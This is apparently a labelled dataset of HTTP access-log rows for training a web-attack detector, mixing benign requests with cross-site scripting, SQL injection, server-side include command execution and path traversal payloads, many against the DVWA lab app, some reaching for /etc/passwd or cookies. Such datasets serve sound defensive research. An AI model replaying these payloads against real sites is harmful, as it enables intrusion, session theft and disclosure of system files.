Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/images/spanner.png?query=query%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,693,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/?password=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/administrator/upload.php?newbanner=1&choice=\\\""<script>alert(document.cookie)</script>",HTTP/1.1,404,515,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
5.138.178.69,-,-,13/Dec/2015:05:24:45 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:42 +0000,GET,/instructions.php/,HTTP/1.1,200,14305,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
213.87.128.6,-,-,13/Dec/2015:01:36:45 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
37.229.199.230,-,-,13/Dec/2015:00:28:11 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1_professionnel.asp?n=/....../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,515,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>,HTTP/1.1,404,510,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,////../../data/config/microsrv.cfg,HTTP/1.1,400,485,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1,HTTP/1.1,404,515,3.0
62.122.96.106,-,-,13/Dec/2015:10:10:20 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
77.34.113.155,-,-,13/Dec/2015:11:37:57 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/?user_token=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/sitemap.xml?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/login.php?=,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query%27+OR+%271%27%3D%271%27+--+,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,POST,/setup.php?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,302,281,2.0
129.188.154.200,-,-,01/Jul/1995:00:13:06 -0400,GET,/,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:59 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1895,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;,HTTP/1.1,404,509,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/add_event_listeners.js?query=query+AND+1%3D2+--+,HTTP/1.1,200,858,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/favicon.ico?query=query+AND+1%3D2+--+,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,301,620,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/dvwa?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,301,630,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt,HTTP/1.1,200,254,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/favicon.ico?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/instructions.php?doc=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/add_event_listeners.js?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,858,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:50 +0000,GET,/setup.php,HTTP/1.1,200,4347,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,5275,2.0
128.70.41.172,-,-,12/Dec/2015:22:22:13 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,301,602,2.0
83.220.236.21,-,-,13/Dec/2015:10:24:11 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query+OR+1%3D1+--+,HTTP/1.1,200,9319,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/?username=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E,HTTP/1.1,302,300,1.0
slip-5.io.com,-,-,01/Jul/1995:00:18:25 -0400,GET,/icons/text.xbm,HTTP/1.0,200,527,0.0
slip1.kias.com,-,-,01/Jul/1995:00:09:55 -0400,GET,/htbin/wais.pl,HTTP/1.0,200,308,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>,HTTP/1.1,404,516,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally),HTTP/1.1,404,507,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/js/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,200,1347,3.0
188.17.60.192,-,-,13/Dec/2015:12:01:00 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/ieedit.stm?url=../,HTTP/1.1,404,516,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/favicon.ico?query=,HTTP/1.1,200,1651,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/js/add_event_listeners.js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,858,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
217.23.186.4,-,-,13/Dec/2015:01:08:17 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05,HTTP/1.1,404,503,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query+OR+1%3D1+--+,HTTP/1.1,200,9319,2.0
37.146.123.167,-,-,13/Dec/2015:06:32:13 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query+AND+1%3D2+--+,HTTP/1.1,200,5275,2.0
95.221.14.168,-,-,13/Dec/2015:10:04:02 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa?query=query%27+UNION+ALL+select+NULL+--+,HTTP/1.1,301,602,2.0
83.69.0.72,-,-,13/Dec/2015:06:20:45 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/login.css?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,POST,/login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,302,281,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/instructions.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,14305,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:43 +0000,GET,/?Login=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
176.124.168.83,-,-,13/Dec/2015:09:57:37 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>,HTTP/1.1,404,517,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,OPTIONS,*,HTTP/1.1,200,162,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/images?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,301,646,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/docs?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,301,734,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:50 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
177.159.102.216,-,-,13/Dec/2015:08:17:51 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4478,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,GET,/instructions.php?doc=PHPIDS-license%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:50 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/dvwa?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,301,632,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query+OR+1%3D1+--+,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:47 +0000,GET,/sitemap.xml?query=ypPmOwBcqEKMfMbUJSpZfAOhLVhkMivOAnrilhpoxLZJqvpVRnRvecZcnKMuIdZtMnUwsxpbxXPhLDSuUheTVfNHRYqtLpPJZogPWRcaCtcgkTQsFCtwbCexhswJPvKeNYnPjZgDdQNaPtSKsBGsnZFnBPqZxfKXcBeMwKXoOMSSxRqoGiKsfXEIUVIGjldUgfdiToiVbfsDyiuKhFsSqIBKfHVOZjiFJJhOtHSWWNByerXXRxqOicEamdboeeURpEqkWxAhjiKUwOjJheBBkAeBKlhysdiGIbQiDSXCNZaSOLMtbUHvUUMTdrYWfUcLAgOrJVXyIgJjmuaPAxYsLVIVdILRsxIqjhLnDuCahuYeQJflCFQWMWxDxwbbYebvifZTVjhIUEGjMyKxSSnvdLZvkHwlFZJKeVXSxpAQUFvwQfbGryuNErvbPTNTFMUoKYNNfHkgmpBBrNfKmQiYuHgtqyEeyheoCLXhAjwnqyAUbbIloRGSujGHUcKuwLIibHCMxfQdiRJhQbUjlpTUdHpmqyYEWAYbnUcgBxmCtaYLplirYqWmJeeOvQUGxFXvKtYgqvETeJtdBavoYNgbVyVksSIoKuxwcFevldGJhOAuEBTcdIXYNHkrLhKuOkxJqUoriQlmcJQdmJWYYXCdLPmaqhecxLEruRLacGxEXBEYcPcXXPwrsgEpKDkGeOAhbyOAukYgZtpxXowaJfElClqJioWPtVJXfnjVJGvdwcBlsXetZxQluLYOHOEAZVUctxOFyLOQTauNWfrbsmPbvInDEDFQSFqkQONTsQKmNwaBkiEZphMJvtfAXXivEGudhTTGdSEbqMFTRPcKSDFqZscMFhhSMXoeixiVtmObEVVEymsViPIGueRlsmNKsZjPnEgAlCtxyxTQmHqyvqMIbPofAFQDvVXbDtFPVaIIPqnDKKZWQirhLYQyJyGfhlHuNaevUnDQakTgiDtIGokEupeuYjuEKKhFWBYFpVcwLDwlFIhfVYKThMQQWNWTFQVVxYPZouJnYLuVAfnvxNxLtpToscisstRjULcjGllbJwBikEqtNprqINHqiaqEmbYHbRbtmvnRIrUeSapMXhrqoriVWmyDciDsKteHOwROEHMooOkqGEGVLPcHNtsmibNCRMMiANeeWANJQdCkFruUomTPIcyMRFJAxFCpYBCScWptkDfOulYwgCWtZnHuagyPsaEoCCRllQTAxOpkhjrjHGFOYFbmYBBoFgBaPBqiexXuPGCntdVxCUjsBhcdcOhWSpikGfXGmTbLkPjICYYXRSpiiBPowryPkVgOHqdlBreAakqEDrxoejFhGEeffoYZlMaPCjuvdyITIfiPJSpqBHPnfMebcOLQASSfDajkoPhVXhQWVwyqmXFdsyOhxEITZmdvXiCRskEiBSXDARPthAIJLCWDXahfEorBQQHbwxvGyuLoShpXrfHrMhHSgRQqnKiTsIiQJnrehmaiusEmlJyxLZZVefKLSRpIynGUaNYyPFwJfDYSZiSCjVEBpOQtuoCFUaUfybZLKDlDdyibgflkPWwcUmKUCpbsIOjkZKWGWxhcSIGnZircnAnNXivwBHemUfkNmSHfQcXGBGSpFXYFpILLcOfXefZYrjeQwOyPURlGdjcEArKRoIXLMpUlZOOylIZJfvLGfgYcnBWUWrnRXAhaiGrYEhQdGuoGnlOFGhgIHFasANlSPAaJRaYwpSQGjtgsnrOinZdRceiUjSjeaxqFbmbIKAqAyqVOSfmybBIEwNgWXaynYoJXdfVCEnLWvAcEgEoTbZHYkSZwHOpVqMroBbvPCGJyNtnxWkWLwimuigLZEmVOvXUOVTjgYSJPPrhwDyjHksMiUFFWNsLQtsnofHjjekytogdRmilukFKYUxpEIJHYwGIGJSOuGAvoIFAXOAhbmAotYXVsqPJBmaAHjDTdDMIEMHelXuFkGkRpoURWgUnFqYXpWSdThVImTVUvHbUNjQJtephUkxDcobZJICZmgCpEGbLORBynswPEvQlqovhUrrOngDTvEOwLldnjyFlNOPBVJkrvhqGOlEtXPdAahOQdBJAXhWGbrHqEpmQq,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/css/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,1703,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/?user_token=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:04 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/favicon.ico?query=query+AND+1%3D2+--+,HTTP/1.1,200,1651,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:03 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/?password=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,POST,/setup.php?query=query+AND+1%3D2+--+,HTTP/1.1,302,281,2.0
185.103.26.14,-,-,13/Dec/2015:10:11:22 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?user_token=OR+1%3D1,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/setup.php?query=query%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,4366,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/about.php?query=query+AND+1%3D1+--+,HTTP/1.1,200,5112,2.0
acs4.acs.ucalgary.ca,-,-,01/Jul/1995:00:17:03 -0400,GET,/,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/?password=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,1845,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/sitemap.xml?query=query+AND+1%3D1+--+,HTTP/1.1,404,447,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
grail911.nando.net,-,-,01/Aug/1995:00:25:47 -0400,GET,/icons/blank.xbm,HTTP/1.0,200,509,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/index.php?page=../../../../../../../../../../etc/passwd,HTTP/1.1,302,478,3.0
